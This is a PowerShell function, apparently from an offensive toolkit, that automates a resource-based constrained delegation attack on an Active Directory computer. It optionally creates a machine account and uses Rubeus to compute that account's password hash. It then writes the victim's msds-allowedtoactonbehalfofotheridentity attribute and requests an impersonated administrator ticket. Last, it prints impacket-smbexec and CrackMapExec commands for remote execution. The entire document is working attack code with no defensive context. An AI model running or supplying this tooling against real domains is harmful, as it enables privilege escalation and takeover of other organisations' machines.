%dependency%

function Invoke-GodWrite
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Victim,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Position = 2)]
        [String]
        $DomainController,

        [Parameter(Position = 3)]
        [String]
        $mComputerName = "sumikko",

        [Parameter(Position = 4)]
        [String]
        $mPwd = "gurashi",

        [Parameter(Position = 5)]
        [String]
        $mPwdNT = "",

        [Parameter(Position = 6)]
        [switch]
        $Create = $false
    )

    if ($Create) {
        New-MachineAccount -MachineAccount $mComputerName -Password $(ConvertTo-SecureString $mPwd -AsPlainText -Force) -Domain $Domain
    }
    if ([string]::IsNullOrEmpty($mPwdNT)) {
	$output = [Rubeus.Program]::MainString("hash /password:$mPwd")
	$mPwdNT = ($output | select -Pattern "rc4_hmac.*: (\w+)" -AllMatches).Matches.Groups[1].Value
    }
    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $mComputerName
    $sid =Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $mComputerName -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    $SDbytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDbytes, 0)
    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $Victim | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Domain $Domain -Server $DomainController

    [Rubeus.Program]::MainString("s4u /user:$mComputerName$ /rc4:$mPwdNT /impersonateuser:administrator /msdsspn:CIFS/$Victim.$Domain /ptt /nowrap")
    $DCIP = (Resolve-DnsName -Name "$DomainController.$Domain").IPAddress
    $TGIP = (Resolve-DnsName -Name "$Victim.$Domain").IPAddress


    Write-Host "`nKRB5CCNAME=`$PWD/$Victim.cc impacket-smbexec -k -no-pass -dc-ip $DCIP -target-ip $TGIP administrator@$Victim.$Domain"
    Write-Host "`nAdd $TGIP $Victim.$Domain to /etc/hosts to use CME"
    Write-Host "KRB5CCNAME=`$PWD/$Victim.cc cme smb -k --kdcHost $DCIP $Victim.$Domain"
}
